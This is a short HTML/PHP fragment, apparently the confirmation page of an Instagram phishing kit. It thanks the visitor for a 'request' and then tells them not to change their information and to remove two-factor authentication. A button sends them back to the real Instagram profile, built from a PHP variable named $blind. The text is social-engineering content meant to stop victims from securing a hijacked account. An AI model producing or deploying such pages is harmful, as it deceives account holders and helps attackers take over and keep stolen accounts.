...
<h2>
        <div class="box">
         <table>
            ...
            <p class="welcome-message">Your request has reached us. We will reach you as soon as possible. Do not change your information during this process. If your account has dual factors, remove it.</p>

            <form action="https://www.instagram.com/<?php echo $blind; ?>/" class="login-form" method="post">
            
                <button class="submit">Back To Account</button>
            </form>
        </div>
    </section>
